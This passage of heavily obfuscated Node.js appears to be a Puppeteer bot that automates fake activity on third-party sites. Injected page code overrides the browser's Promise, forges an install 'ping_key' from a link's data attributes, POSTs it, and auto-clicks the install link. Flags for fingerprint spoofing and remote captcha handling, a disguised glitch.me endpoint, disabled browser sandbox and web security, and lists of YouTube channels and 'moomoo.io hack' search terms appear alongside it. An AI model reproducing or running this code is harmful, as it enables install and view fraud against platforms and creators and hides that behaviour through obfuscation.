                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xf1 * -0x21 + -0x2155 + 0xef * 0x45 | L >>> -0x9 * 0x3ad + -0x87e + 0x29ae) + (M & N | ~M & O) + P + (0x3b1647fc + 0x142466df + 0xb47cabe) + Q[J] << -0xd * -0x2b3 + 0x1816 + 0x3b2d * -0x1) << -0x1 * -0x1208 + -0x9 * -0x445 + -0x3870 | P >>> -0x9de + -0xb9f + 0x1598) + (L & (M = M << 0x1d1f + 0x17e0 * -0x1 + -0x521 | M >>> -0x1 * 0x8c9 + 0x55f * 0x2 + 0x1f3 * -0x1) | ~L & N) + O + (-0x12bef8bf * 0x2 + 0xc90b1 + -0x2a7c22 * -0x303) + Q[J + (0x991 + -0x12a2 + 0x102 * 0x9)] << 0xb2a + 0x6a3 * 0x5 + -0x2c59 * 0x1) << 0x867 * -0x4 + 0x3c7 * -0x7 + -0x3c12 * -0x1 | O >>> -0x2e * -0xbc + -0x23c0 + 0x213) + (P & (L = L << -0x7 * -0x4dc + 0x431 * 0x2 + -0x2a48 | L >>> -0x89d * 0x4 + -0x1fb9 + 0x422f) | ~P & M) + N + (0x2f1f5712 + -0x11a3ae2 + -0x31a3f * -0xe57) + Q[J + (-0x26b0 + 0x453 + -0x3 * -0xb75)] << 0x1f4d + 0xc1b + -0x2b68) << 0x18f5 + 0xbed + -0x24dd | N >>> 0x2016 + 0x1 * 0x6a7 + -0x2e * 0xd7) + (O & (P = P << -0xb45 + -0x2606 * -0x1 + -0x1aa3 | P >>> 0x2392 + -0xd14 + -0x167c) | ~O & L) + M + (0x1b64e809 * 0x6 + 0x562ee * -0xe53 + 0x34d208d) + Q[J + (0x2f * -0x47 + -0x1543 + 0x224f)] << -0x1a75 + 0x1988 + 0xed) << 0x30 * -0x59 + -0x32 + 0x1 * 0x10e7 | M >>> 0x21ab + -0x4 * -0x23 + -0x4a * 0x76) + (N & (O = O << -0xe80 + -0x7c2 + 0x1660 | O >>> 0xad7 + -0x3 * -0x10c + 0xdf9 * -0x1) | ~N & P) + L + (0xe768994 * -0x7 + -0x589 * 0xbb504 + -0x807 * -0x1ff5af) + Q[J + (-0x9d2 + 0x2 * 0xbb + 0x218 * 0x4)] << 0x20c + -0xe5 * 0x27 + -0x20d7 * -0x1, N = N << 0xb1b * 0x1 + 0x1225 + -0x6 * 0x4db | N >>> -0x1edd + 0x1469 + 0xa76;
              for (; J < 0x136b + -0xafd * 0x1 + 0x2c2 * -0x3; J += 0x7 * -0x4c7 + -0x223f * -0x1 + -0x1 * 0xc9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x960 + -0x2f * -0x8f + -0x239c | L >>> 0x1212 + -0x13 * 0xf6 + 0xf * 0x5) + (M ^ N ^ O) + P + (-0x4 * -0x28e6f2e5 + -0x5817aefe + 0x1 * 0x2355cf0b) + Q[J] << -0x1546 + 0x1790 * -0x1 + 0x2 * 0x166b) << -0xb35 * 0x2 + -0xd5 * -0x1 + 0x159a | P >>> -0x19dd + -0xeb6 * -0x2 + 0x44 * -0xd) + (L ^ (M = M << -0xe60 + 0x1 * 0x3d1 + 0x38f * 0x3 | M >>> 0x6a1 * -0x5 + 0x256c + -0x445) ^ N) + O + (0x11652659 + 0x6d1aecb9 + -0xfa62771) + Q[J + (0xc86 + -0x1 * -0x141b + 0x570 * -0x6)] << -0x1ef9 + 0xd49 + 0x11b0) << -0x234d + -0x4ee * 0x1 + 0x508 * 0x8 | O >>> -0x3b * 0x9d + -0xefa + -0x4 * -0xcd1) + (P ^ (L = L << 0x1827 + -0xa29 + -0xde0 | L >>> 0x160f + 0x6b * -0x29 + -0x11 * 0x4a) ^ M) + N + (0x5fe07881 + -0xb2b19ecb * -0x1 + -0xa3b82bab) + Q[J + (-0x2 * 0x71 + 0x35 * -0x5 + -0x1d * -0x11)] << 0x1c8c + -0x1 * 0x1b1 + -0x1adb) << 0xfe * -0x1f + -0x104b * 0x2 + -0x3 * -0x151f | N >>> -0xd50 + 0x1c3f * -0x1 + 0x29aa * 0x1) + (O ^ (P = P << -0x3 * 0x815 + 0xa79 * -0x2 + 0x2d4f | P >>> 0x1dee + 0x10d7 * -0x1 + 0x11 * -0xc5) ^ L) + M + (0x83ea6090 + -0x5345b78d + 0x3e35429e) + Q[J + (-0x1b31 + 0x920 * 0x1 + -0x164 * -0xd)] << -0x5 * 0x226 + 0x21f9 + -0x13 * 0x139) << -0x3 * 0x9c2 + 0x25 * -0x86 + 0x30a9 | M >>> 0x1b * -0x21 + 0x5d3 + 0x3 * -0xbf) + (N ^ (O = O << 0x32 + -0x1e4a + -0x2 * -0xf1b | O >>> -0x16ce + 0x187e + -0x1ae) ^ P) + L + (0xa41c3af7 + -0x6185fb25 + 0x2c43abcf) + Q[J + (-0x1 * -0x206b + 0x1bde + -0x8b * 0x6f)] << 0x1499 + 0xb * 0x375 + -0x3aa0, N = N << -0x36f + -0x252d + -0x191 * -0x1a | N >>> -0x1 * -0x1b7a + -0x256d + 0x9f5;
              for (; J < 0x2ea + -0x874 + 0x2e3 * 0x2; J += -0x2b8 + 0x7e + 0x23f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2 * -0xc9 + -0x1d7 + -0x1b7 * -0x2 | L >>> 0x2 * 0x12e3 + 0x254f + -0x4afa) + (M & N | M & O | N & O) + P - (0xc * -0xbf96821 + -0x2 * -0x28b1d0ba + 0xaf31833c) + Q[J] << -0x2175 + -0x840 + 0x29b5) << 0xff7 + -0x51 * -0x1 + -0x17 * 0xb5 | P >>> -0x1674 + -0x1d * -0x13f + -0x9e * 0x16) + (L & (M = M << -0x1 * 0x1c37 + 0x17fb + 0x2 * 0x22d | M >>> -0x18c8 + 0x24a2 + -0x2 * 0x5ec) | L & N | M & N) + O - (0x2b1341a * 0x4d + -0x1 * 0x4f710a65 + -0xef75e49) + Q[J + (-0x2595 + -0x1 * -0x2635 + -0x9f)] << 0x4cf * -0x8 + 0x40 * 0xd + 0x2338) << 0xda2 + -0x1 * -0x19d5 + -0x2772 | O >>> -0x59e + -0x48 * -0x1d + -0x26f * 0x1) + (P & (L = L << -0x59 * -0x5 + 0x1 * -0xeae + 0xd0f | L >>> 0x281 * -0x2 + -0xd * 0x2e7 + 0x2abf) | P & M | L & M) + N - (0x7548430 + 0x302c739d + 0x39634b57 * 0x1) + Q[J + (0x1001 + -0x7f1 + 0x407 * -0x2)] << -0x1081 + -0x1211 * -0x1 + -0xa * 0x28) << -0x186 + -0x1800 + 0x198b | N >>> -0x247a + 0x7bd + 0x1a * 0x11c) + (O & (P = P << 0x2651 + -0x35 * -0x67 + -0x3b86 | P >>> -0x5df * 0x2 + -0x1ba7 + 0x2767) | O & L | P & L) + M - (-0x1 * -0xbe5f399b + -0x68e4c64 + -0x46ecaa13) + Q[J + (0x1bbd + 0x15 * -0x62 + -0x8 * 0x276)] << -0x1de * 0x1 + -0x22e5 + -0x3 * -0xc41) << 0x372 * 0x1 + -0x568 + 0x1fb | M >>> 0x129f + 0x21e1 + -0x3465) + (N & (O = O << -0x1 * -0x1309 + 0xce7 + -0xfe9 * 0x2 | O >>> 0x1261 + -0x1877 + 0x618) | N & P | O & P) + L - (0xd3f98001 * -0x1 + -0x13 * 0xa0161dd + 0x202f8068c) + Q[J + (0x1 * 0x1d99 + 0x12b9 + -0x304e)] << 0x1 * 0x1f8a + -0x257f * -0x1 + -0x4509, N = N << -0x15f6 + 0x9 * -0x407 + 0x3a53 | N >>> 0x2016 + 0x1a3d + -0x3a51;
              for (; J < 0x3 * -0x865 + -0x46f + 0xef7 * 0x2; J += -0xaa9 * 0x1 + 0x289 + 0x825)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1d38 + 0x896 * 0x4 + -0x3f8b * 0x1 | L >>> -0x15cf * 0x1 + 0x1be0 + -0xda * 0x7) + (M ^ N ^ O) + P - (0x3c484dac + 0x64483ee2 + -0x6af34e64) + Q[J] << 0x1a * 0x11c + -0x5 * 0x7b2 + -0x9a2 * -0x1) << 0x10e2 + 0x5fe * 0x1 + -0x16db | P >>> -0xa87 + -0x241b + -0x2ebd * -0x1) + (L ^ (M = M << 0x5 * -0x5cb + 0x745 * -0x4 + 0x3a29 * 0x1 | M >>> 0x19a4 + 0x22f + -0x1bd1) ^ N) + O - (-0x16ce0de0 + -0x1 * 0x4190f63e + 0x8dfc4248) + Q[J + (-0x28d * -0xb + 0x2 * -0x24e + -0x1 * 0x1772)] << 0x1a36 + -0x10da + -0x4 * 0x257) << 0xa * 0x16f + 0x95d + -0x17ae | O >>> -0xfee + -0x357 + -0x136 * -0x10) + (P ^ (L = L << 0x1 * 0x15d + -0xa * -0x15f + -0xef5 | L >>> 0x2227 + -0x7ea + -0x1a3b) ^ M) + N - (0x56cd0cae + -0x2ba1a54 * -0x17 + 0x30 * -0x1ff80eb) + Q[J + (-0x5 * -0x2df + 0x5 * 0x7b1 + -0x34ce)] << 0x9 * -0xcb + 0x2621 + -0x1efe) << -0xeac + 0x16cc + -0x81b | N >>> 0x815 * -0x1 + 0x29 * 0xb5 + 0xf * -0x163) + (O ^ (P = P << -0x1da5 + -0x38f * 0x5 + -0x17c7 * -0x2 | P >>> 0x91b * 0x1 + 0x1 * -0x269b + -0x1d82 * -0x1) ^ L) + M - (-0x2 * 0x791b182 + 0x1bed0405 * -0x1 + 0x60ada533 * 0x1) + Q[J + (0x2a * -0x2a + 0x1093 + -0x9ac)] << 0x1628 + -0x2 * -0x3ad + 0x3 * -0x9d6) << -0x37 + -0x1560 + 0x159c | M >>> -0x6e3 + 0x25 * -0x71 + -0x1 * -0x1753) + (N ^ (O = O << -0xf88 + -0x1a07 * 0x1 + 0x29ad * 0x1 | O >>> -0x15 * -0x14 + -0x2ed * 0x1 + 0x14b * 0x1) ^ P) + L - (0x669bba5f + 0x261c65d9 + 0x1 * -0x571ae20e) + Q[J + (-0xa7c + 0x18 * 0x19d + -0x968 * 0x3)] << -0x350 + -0x1df1 + -0x1 * -0x2141, N = N << -0x177 * -0x5 + -0x693 * -0x3 + -0x9 * 0x2fe | N >>> -0x112a * -0x1 + -0x1efe + 0xe * 0xfd;
              this['h0'] = this['h0'] + L << 0x1ed8 + -0xf4 * -0x2 + 0x1 * -0x20c0, this['h1'] = this['h1'] + M << -0x3d * 0x59 + -0x1e07 * -0x1 + -0x469 * 0x2, this['h2'] = this['h2'] + N << -0xc * -0x2bf + 0x1686 + -0x62a * 0x9, this['h3'] = this['h3'] + O << -0x742 + -0x14e0 + 0x1c22, this['h4'] = this['h4'] + P << -0x985 + -0x542 * -0x7 + -0x1b49;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1 * -0x23f2 + -0x1 * 0x599 + 0x29a7 & 0x1c6 * 0x14 + -0x7e * 0x21 + -0x132b] + w[J >> -0x51 * 0x3d + -0xd49 * -0x1 + -0x22 * -0x2e & 0x865 + -0x8 * 0x7a + 0x3 * -0x182] + w[J >> 0x1 * -0xaa2 + 0xb * -0x13f + 0x7 * 0x37d & 0x1 * 0x16ee + 0x30c + -0x19eb] + w[J >> -0x1b2 * -0xd + -0x8f7 + -0x1 * 0xd03 & 0x12 * -0x21e + -0x1b6 + -0xf9 * -0x29] + w[J >> 0x42d * -0x5 + 0x570 + 0xf7d & -0x853 * 0x2 + -0x105a + -0x193 * -0x15] + w[J >> -0x58e + -0x7e8 + 0xd7e * 0x1 & 0x4 * 0x246 + 0x2630 + 0x2f39 * -0x1] + w[J >> 0x1dbd + 0x43a * 0x7 + -0x3b4f & -0x43d + 0x2 * -0x2e + 0x4a8] + w[0x1b37 + 0x1 * 0x1a99 + -0x35c1 & J] + w[K >> 0x2c3 * -0x9 + -0x2 * -0x950 + -0x1 * -0x657 & -0x52c + -0x1a87 + 0x1fc2] + w[K >> -0x1995 + -0x1d80 + 0x372d & -0x2122 * -0x1 + -0xc64 + -0x1 * 0x14af] + w[K >> 0x1164 * -0x1 + 0xbf + 0x10b9 & 0x1 * 0x529 + -0x2 * -0x133a + -0x2b8e] + w[K >> 0xfb2 + 0x1619 + -0x25bb & 0x17 * 0xc1 + -0x3 * -0x651 + -0x243b] + w[K >> 0x12b1 + -0xf25 * -0x2 + 0x1 * -0x30ef & 0x5 * 0x36d + -0x22a8 + 0x1196] + w[K >> -0x173 * 0xd + -0x33 * -0x5 + 0x11e0 & 0xb68 + 0x7f7 * -0x3 + 0x646 * 0x2] + w[K >> 0x10ae + 0xd6c * -0x2 + 0x2 * 0x517 & -0x1225 + 0x361 + 0xed3] + w[-0xdad + 0x516 * -0x6 + 0x2c40 & K] + w[L >> 0x246 + -0x13 * -0x12d + -0x1 * 0x1881 & 0x179f + -0x1 * -0x1af5 + -0x3285] + w[L >> 0x2 * 0x37c + -0x1a0a * -0x1 + -0x1 * 0x20ea & 0x17 * 0x15d + 0x62 * -0x29 + -0xf9a] + w[L >> 0x1f5a + -0x13a3 * -0x1 + 0x32e9 * -0x1 & 0xc12 * 0x3 + -0x9ef * 0x1 + -0x8 * 0x347] + w[L >> 0xe0b + -0x4 * 0x939 + 0x159 * 0x11 & 0xc3b * 0x1 + 0x195 + -0x7 * 0x1f7] + w[L >> -0x1 * 0x136d + -0x6b * -0x6 + 0x2b * 0x65 & 0xc7 * -0x26 + 0x1 * -0xcd6 + 0x1 * 0x2a6f] + w[L >> 0xe * -0xc + -0x2276 + 0x2326 & -0x53 * -0x2e + -0xca * 0x1a + -0x5a9 * -0x1] + w[L >> 0x1452 + -0x7 * 0x9f + 0xff5 * -0x1 & -0x17f * -0x10 + 0x1 * -0x13b3 + 0x1 * -0x42e] + w[-0x2e * 0xd2 + -0x12a6 * -0x1 + 0x1325 & L] + w[M >> 0x55 * 0x35 + 0x1ab0 + -0x2c2d * 0x1 & -0x329 + 0x10f3 * 0x1 + 0x25 * -0x5f] + w[M >> -0x1 * 0x2c5 + 0x2065 + -0x1d88 & -0x191 + 0x394 + 0xfa * -0x2] + w[M >> -0x6c1 * 0x2 + 0x56 * -0x31 + 0x1e0c & -0x6a9 * -0x1 + -0x12fe + 0xc64] + w[M >> 0x1 * 0x18c3 + 0x1b4c + 0x5c7 * -0x9 & 0x1 * -0x10c1 + 0x247b + -0x13ab] + w[M >> -0x1e39 + -0x214 * -0x2 + 0x1a1d & -0x2 * 0x443 + 0x1c41 + -0x4 * 0x4eb] + w[M >> 0x1682 + -0x190b * -0x1 + 0x5 * -0x981 & 0xd01 * -0x3 + -0xcb + 0x27dd] + w[M >> -0x17a8 * -0x1 + 0x1675 + -0x2e19 & 0x3 * -0x1f7 + -0x1 * -0x16f7 + -0x1103] + w[-0x114 * -0x15 + 0xb43 + -0x21d8 & M] + w[N >> 0xaf9 + 0x18bd + 0x62 * -0x5d & 0x2332 + 0xf36 + 0x3259 * -0x1] + w[N >> 0x3 * -0x413 + -0x1657 * -0x1 + -0xa06 & -0xdf + -0x1f3c + -0x1 * -0x202a] + w[N >> -0x3 * -0xa8a + 0x54c + 0x1 * -0x24d6 & 0xc90 + 0x2fd + -0xf7e] + w[N >> -0x4c * -0x20 + 0x393 + 0xd03 * -0x1 & -0x501 + -0x1656 + -0x922 * -0x3] + w[N >> 0x531 + -0x1 * -0x1ba9 + -0x20ce & 0x5cc + -0x37a + -0x243] + w[N >> 0x22fa + -0x950 + -0x2 * 0xcd1 & 0x8e8 + 0x14 * -0x194 + 0x16b7 * 0x1] + w[N >> 0x11ed + 0x18de + 0xe9 * -0x2f & -0x1ef1 + -0x755 + -0x3 * -0xcc7] + w[-0x1768 + 0x47c + 0x12fb & N];
            }
            ['digest']() {
              const V = c;
              this[V(0x16)]();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x221a + -0x1b7a * -0x1 + -0x1 * 0x3d7c & -0x26e0 + 0xd9e + 0x1a41,
                J >> -0xf36 + 0x1 * -0xe93 + -0x1dd9 * -0x1 & -0x421 + 0x1d73 + -0x1 * 0x1853,
                J >> 0x1396 + -0xd2b + 0xf * -0x6d & -0x14 * -0x124 + -0x2cc + 0x21d * -0x9,
                -0x1cda + -0x1d91 + 0x3b6a & J,
                K >> 0x1d41 + -0xbca + -0x115f * 0x1 & 0x2d0 + 0x971 * 0x1 + -0x83 * 0x16,
                K >> -0x17b9 + -0x1f3 + -0x24 * -0xb7 & 0x17ca + -0x42d * -0x6 + -0x2fd9,
                K >> -0x3 * -0x2fe + 0x39 * 0x57 + -0x1c51 & 0x225b + 0x1a5c + -0x3bb8,
                0xe88 + -0x3f * -0x3e + -0x5b * 0x51 & K,
                L >> 0xf7b + -0x25c6 + 0x1663 & 0x5 * -0x1b8 + -0x1c18 + -0x1 * -0x25af,
                L >> -0x1c5 * 0xd + 0x26cf + -0xfbe & -0x49 * 0x7 + 0xdc * 0xb + -0x676,
                L >> 0x647 + 0xdf8 + -0x1437 & 0xa4d * -0x2 + -0x8 * -0x24b + 0x1 * 0x341,
                -0x80 + 0x11 * -0x150 + 0x17cf & L,
                M >> 0x1 * -0x8ee + 0x8 * 0x1eb + -0x652 & 0x9f * -0x5 + 0x87 * -0x2f + 0x1ce3,
                M >> 0x170c + -0x1fb7 + -0x1 * -0x8bb & 0x223f + -0x1b65 + -0x5db,
                M >> 0x145c + 0x50 * 0x32 + 0x4 * -0x8fd & 0x3c * 0x94 + 0x1476 + -0x3627 * 0x1,
                0xaa4 * -0x1 + 0x7a2 * -0x3 + -0x3 * -0xb83 & M,
                N >> 0xc79 * 0x3 + -0x4 * 0x2d4 + -0x1a03 & 0x3e * 0x7 + -0x21e * 0x12 + 0x2569,
                N >> -0x2 * -0xf98 + 0xd7 * 0x1 + 0x1 * -0x1ff7 & -0x1402 + 0xfe3 + 0x51e,
                N >> -0x19c2 + -0x25 * 0x9b + 0x3031 * 0x1 & 0x1f56 + 0x512 + -0x2369,
                -0x21f4 * 0x1 + -0xa79 + -0x2ac * -0x11 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x83a + 0x1 * -0x125 + -0xb * 0xa3), (K = new DataView(J))['setUint32'](-0x2188 * -0x1 + -0xa1c * -0x2 + 0x56 * -0xa0, this['h0']), K['setUint32'](-0x1153 + -0x8a3 * 0x1 + 0x19fa, this['h1']), K['setUint32'](0x1c75 + 0x7f * 0x31 + -0x34bc, this['h2']), K['setUint32'](-0x12 * 0x1a1 + -0x1253 * 0x1 + 0x2fb1 * 0x1, this['h3']), K['setUint32'](0x163d * 0x1 + 0x1076 + 0x7 * -0x585, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x1c * -0x11b + -0x1d07 + -0x1d * 0x11];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x266 + -0xd82 + 0xfe8;
            J[0x214d + 0x12b1 + -0xa66 * 0x5]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x220a + -0x1823 + -0x35 * -0x119] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x737 * -0x1 + 0x2 * -0x167 + -0x468), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x177 * -0x1 + -0x305 * 0x3 + 0x799;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x13cc + 0x14d3 + 0xb * -0x329), Promise['resolve'](0x26d4 + -0xe83 + -0x1850);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s[W(0xc)](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x16 * 0x133 + -0xbb3 + -0xeaf; j < -0x14ff + -0x65c + 0x1b5c; j++)
    i();
}
const NETWORK_PATIENCE = 0x829 * -0x4 + -0x335 * 0x13 + 0x245 * 0x37 + (0x1 * 0x2144 + 0x2 * -0x77 + 0x1 * -0x149e) * Math['random'](),
  MM_NETWORK_PATIENCE = (0xc3e * -0x2 + 0x1 * 0x1319 + 0x566) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x10d1 + -0x257c * -0x1 + -0x14ab);
    let h = e[f];
    return h;
  }, d(b, c);
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x10d1 + -0x257c * -0x1 + -0x14ab);
    let h = e[f];
    if (c['mrWvZm'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0xe8 + -0x1d81 + 0x1c99, r, s, t = 0xa * 0x21a + -0x1103 + -0x401; s = m['charAt'](t++); ~s && (r = q % (-0x1c57 + 0x1 * -0x136c + 0x97 * 0x51) ? r * (-0x6b0 + 0x957 + -0x267) + s : s, q++ % (-0x1f5 + -0x1b41 + 0x9be * 0x3)) ? o += String['fromCharCode'](-0x1317 + 0xf4e + 0x4c8 & r >> (-(0x2e6 + 0x1de6 + 0x1 * -0x20ca) * q & 0x6fa * -0x3 + -0x1b73 + 0x1 * 0x3067)) : -0x1 * -0xef + 0xc5f * 0x2 + -0x19ad) {
          s = n['indexOf'](s);
        }
        for (let u = 0x22e0 * 0x1 + 0x1c41 + 0x3 * -0x150b, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xbcc * 0x1 + -0x11da + -0xedb * -0x2))['slice'](-(0x6d * -0x2 + 0xd * 0x1d8 + -0x171c));
        }
        return decodeURIComponent(p);
      };
      c['zwdjJq'] = i, b = arguments, c['mrWvZm'] = !![];
    }
    const j = e[0x19b * 0x17 + 0x7e4 + -0x95 * 0x4d],
      k = f + j,
      l = b[k];
    return !l ? (h = c['zwdjJq'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x10d1 + -0x257c * -0x1 + -0x14ab);
    let h = e[f];
    if (b['TrVsKb'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0xe8 + -0x1d81 + 0x1c99, s, t, u = 0xa * 0x21a + -0x1103 + -0x401; t = n['charAt'](u++); ~t && (s = r % (-0x1c57 + 0x1 * -0x136c + 0x97 * 0x51) ? s * (-0x6b0 + 0x957 + -0x267) + t : t, r++ % (-0x1f5 + -0x1b41 + 0x9be * 0x3)) ? p += String['fromCharCode'](-0x1317 + 0xf4e + 0x4c8 & s >> (-(0x2e6 + 0x1de6 + 0x1 * -0x20ca) * r & 0x6fa * -0x3 + -0x1b73 + 0x1 * 0x3067)) : -0x1 * -0xef + 0xc5f * 0x2 + -0x19ad) {
          t = o['indexOf'](t);
        }
        for (let v = 0x22e0 * 0x1 + 0x1c41 + 0x3 * -0x150b, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xbcc * 0x1 + -0x11da + -0xedb * -0x2))['slice'](-(0x6d * -0x2 + 0xd * 0x1d8 + -0x171c));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x19b * 0x17 + 0x7e4 + -0x95 * 0x4d,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xf4 * 0x23 + 0x1b6e + -0x1f * 0x1f6; u < -0x1c4c * 0x1 + 0x308 + 0x1a44; u++) {
          p[u] = u;
        }
        for (u = 0x19 * -0xf1 + 0x1f7 * -0xa + 0x2b2f; u < -0x89 * 0x29 + -0x6 * -0x5c3 + -0xba1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1065 * 0x1 + -0x1fff + 0x1b4 * 0x1d), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x4e9 + -0x1 * -0xbf7 + -0x70e, q = 0x205 * 0xb + -0x45 * -0x39 + 0x25 * -0x104;
        for (let v = -0x35b * -0x4 + -0x82 * -0x2a + 0x458 * -0x8; v < n['length']; v++) {
          u = (u + (0x1664 * 0x1 + -0xf2 * 0x1a + -0x33 * -0xb)) % (0xb * 0x8f + 0x1 * -0x8da + 0x3b5), q = (q + p[u]) % (0x18b3 * -0x1 + -0x1aa6 + -0x5d1 * -0x9), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x25 * 0x9b + 0x751 + 0x1016)]);
        }
        return t;
      };
      b['XNjekz'] = m, c = arguments, b['TrVsKb'] = !![];
    }
    const j = e[-0x13be + -0x59 * 0x8 + -0x1686 * -0x1],
      k = f + j,
      l = c[k];
    return !l ? (b['aKXBMy'] === undefined && (b['aKXBMy'] = !![]), h = b['XNjekz'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + X(0x12, 'ler2') + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0xd9 * -0x13 + -0x6b * 0x13 + -0x37 * 0x26; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + Y(0x8) + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 